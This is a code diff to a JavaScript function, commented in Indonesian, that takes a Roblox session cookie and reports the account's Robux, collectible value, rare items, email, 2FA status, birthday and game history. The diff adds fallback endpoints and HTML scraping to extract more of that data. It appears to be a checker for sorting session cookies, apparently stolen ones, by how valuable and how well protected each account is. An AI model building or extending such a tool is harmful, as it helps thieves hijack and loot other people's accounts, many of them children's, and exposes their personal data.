@@ -81,6 +81,7 @@ async function checkCookie(cookie) {
         'Accept': 'application/json'
     };
     try {
+        // ===== 1. Ambil data user =====
         const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
         if (!userRes.ok) {
             const text = await userRes.text();
@@ -90,17 +91,34 @@ async function checkCookie(cookie) {
         const userID = userData.id;
         const username = userData.name || 'N/A';
 
-        // Robux
+        // ===== 2. Ambil Robux (pakai mobileapi sebagai fallback) =====
         let robux = 0;
         try {
+            // Coba endpoint utama
             const robuxRes = await fetch('https://economy.roblox.com/v1/users/authenticated/currency', { headers });
             if (robuxRes.ok) {
                 const robuxData = await robuxRes.json();
                 robux = robuxData.robux || 0;
+            } else {
+                // Fallback: pakai mobileapi (masih sering jalan)
+                const fallbackRes = await fetch('https://www.roblox.com/mobileapi/userinfo', { headers });
+                if (fallbackRes.ok) {
+                    const fallbackData = await fallbackRes.json();
+                    robux = fallbackData.RobuxBalance || 0;
+                }
             }
-        } catch (e) {}
+        } catch (e) {
+            // Jika error, coba mobileapi lagi
+            try {
+                const fallbackRes = await fetch('https://www.roblox.com/mobileapi/userinfo', { headers });
+                if (fallbackRes.ok) {
+                    const fallbackData = await fallbackRes.json();
+                    robux = fallbackData.RobuxBalance || 0;
+                }
+            } catch (e2) {}
+        }
 
-        // RAP & Items
+        // ===== 3. RAP & Items =====
         let rap = 0, itemCount = 0;
         try {
             const invRes = await fetch(`https://inventory.roblox.com/v1/users/${userID}/assets/collectibles?limit=100`, { headers });
@@ -112,7 +130,7 @@ async function checkCookie(cookie) {
             }
         } catch (e) {}
 
-        // Friends & Followers
+        // ===== 4. Friends & Followers =====
         let friends = 0, followers = 0;
         try {
             const fRes = await fetch(`https://friends.roblox.com/v1/users/${userID}/friends/count`, { headers });
@@ -121,7 +139,7 @@ async function checkCookie(cookie) {
             if (folRes.ok) { const d = await folRes.json(); followers = d.count || 0; }
         } catch (e) {}
 
-        // Korblox & Headless
+        // ===== 5. Korblox & Headless =====
         let korblox = false, headless = false;
         try {
             const korRes = await fetch(`https://inventory.roblox.com/v1/users/${userID}/items/102611803/is-owned`, { headers });
@@ -132,7 +150,7 @@ async function checkCookie(cookie) {
             if (headRes.ok) { const d = await headRes.json(); headless = d.isOwned || false; }
         } catch (e) {}
 
-        // Account Age
+        // ===== 6. Account Age =====
         let accountAge = 0;
         try {
             const ageRes = await fetch(`https://users.roblox.com/v1/users/${userID}`, { headers });
@@ -146,16 +164,19 @@ async function checkCookie(cookie) {
             }
         } catch (e) {}
 
-        // Email, Verified, 2FA, Birthday, Age Group
+        // ===== 7. Email (pakai API alternatif) =====
         let email = 'N/A';
         let emailVerified = false;
         let twoFactorEnabled = false;
         let ageGroup = 'N/A';
         let birthday = 'N/A';
+
+        // Coba ambil email dari endpoint account/settings (masih sering jalan)
         try {
             const settingsRes = await fetch('https://www.roblox.com/account/settings', { headers });
             if (settingsRes.ok) {
                 const html = await settingsRes.text();
+                // Cari email di HTML
                 const emailMatch = html.match(/<input[^>]*id="email"[^>]*value="([^"]*)"/i);
                 if (emailMatch) {
                     email = emailMatch[1];
@@ -164,15 +185,36 @@ async function checkCookie(cookie) {
                         email = local.charAt(0) + '*******@' + domain;
                     }
                 }
+                // Cek verified
                 const verifiedMatch = html.match(/<span[^>]*id="email-verified"[^>]*>([^<]*)</i);
                 if (verifiedMatch) {
                     emailVerified = verifiedMatch[1].toLowerCase().includes('verified');
                 }
+                // Cek 2FA
                 const twoFAMatch = html.match(/<input[^>]*id="twoStepEnabled"[^>]*checked/i);
                 twoFactorEnabled = !!twoFAMatch;
             }
         } catch (e) {}
 
+        // Fallback: ambil email dari API users (jika tersedia)
+        if (email === 'N/A') {
+            try {
+                const emailRes = await fetch(`https://users.roblox.com/v1/users/${userID}`, { headers });
+                if (emailRes.ok) {
+                    const emailData = await emailRes.json();
+                    if (emailData.email) {
+                        email = emailData.email;
+                        if (email && email.includes('@')) {
+                            const [local, domain] = email.split('@');
+                            email = local.charAt(0) + '*******@' + domain;
+                        }
+                        emailVerified = true;
+                    }
+                }
+            } catch (e) {}
+        }
+
+        // ===== 8. Birthday & Age Group =====
         try {
             const birthRes = await fetch(`https://users.roblox.com/v1/users/${userID}`, { headers });
             if (birthRes.ok) {
@@ -190,7 +232,7 @@ async function checkCookie(cookie) {
             }
         } catch (e) {}
 
-        // Avatar URL
+        // ===== 9. Avatar URL =====
         let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userID}&width=100&height=100&format=png`;
         try {
             const thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userID}&size=100x100&format=Png`, { headers });
@@ -202,13 +244,13 @@ async function checkCookie(cookie) {
             }
         } catch (e) {}
 
-        // Summary
+        // ===== 10. Summary =====
         const summary = {
             username, userID, robux, rap, itemCount, friends, followers, accountAge,
             email, emailVerified, twoFactorEnabled, ageGroup, birthday, korblox, headless, avatarUrl
         };
 
-        // Game History
+        // ===== 11. Game History =====
         let gameHistory = [];
         let totalGamesPlayed = 0;
         try {
